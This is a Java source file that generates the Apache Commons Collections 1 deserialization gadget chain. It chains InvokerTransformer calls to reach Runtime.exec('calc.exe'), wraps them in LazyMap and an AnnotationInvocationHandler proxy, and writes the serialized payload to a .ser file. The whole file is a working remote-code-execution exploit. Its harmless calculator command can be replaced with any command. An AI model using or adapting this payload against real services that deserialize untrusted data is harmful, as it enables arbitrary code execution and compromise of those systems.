package CommonsCollections1;

import org.apache.commons.collections.Transformer;

import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.*;
import java.lang.Runtime;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
// import sun.reflect.annotation.AnnotationInvocationHandler;
import java.util.Map;

import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Proxy;
import java.lang.reflect.InvocationHandler;

public class exp {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {
        final Transformer[] trans = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ), // Get the getruntime method
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}), // get the runtime class
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new String[]{"calc.exe"}) // rce
        };

        final Transformer chained = new ChainedTransformer(trans);
        final Map innerMap = new HashMap();
        final Map outMap = LazyMap.decorate(innerMap, chained);


        final Constructor<?> han_con = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        han_con.setAccessible(true);
        InvocationHandler han = (InvocationHandler) han_con.newInstance(Override.class, outMap);

        final Map mapProxy = (Map) Proxy.newProxyInstance(exp.class.getClassLoader(), outMap.getClass().getInterfaces(), han);


        final Constructor<?> out_con = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        out_con.setAccessible(true);
        InvocationHandler out = (InvocationHandler) out_con.newInstance(Override.class, mapProxy);

        // write serialize payload to commoncollections1.ser
        FileOutputStream fo = new FileOutputStream(new File(System.getProperty("user.dir") + "/src/resources/commoncollections1.ser"));
        ObjectOutputStream obj = new ObjectOutputStream(fo);
        obj.writeObject(out);
        obj.close();
    }
}
